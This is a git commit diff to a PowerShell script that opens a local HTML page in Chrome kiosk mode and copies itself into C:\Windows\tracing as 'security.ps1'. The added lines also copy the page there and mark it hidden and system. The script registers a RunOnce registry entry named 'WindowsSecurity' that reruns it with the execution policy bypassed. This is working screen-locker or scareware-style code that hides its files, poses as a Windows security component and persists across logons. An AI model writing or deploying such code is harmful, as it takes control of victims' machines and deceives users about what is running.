7bde74798cfe5018b47d83868f88cea79081eca0
m00nbyt3 <moon_byte@protonmail.com>
2025-02-11 09:41:21 +0100

    added control for not repiting things and added html and hidde

--- v2/script.ps1
+++ v2/script.ps1
@@ -5,5 +5,12 @@ $fullPath = Resolve-Path .\index.html;
 Start-Process 'chrome.exe' -ArgumentList "--kiosk $fullPath";
 
 Copy-Item -Path "./script.ps1" -Destination "C:\Windows\tracing\security.ps1";
+if ($? -eq $false)
+{
+	return;
+}
+
+Copy-Item -Path "./index.html" -Destination "C:\Windows\tracing\index.html";
+Set-ItemProperty -Path "C:\Windows\tracing\index.html" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsSecurity" /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\tracing\security.ps1" /f
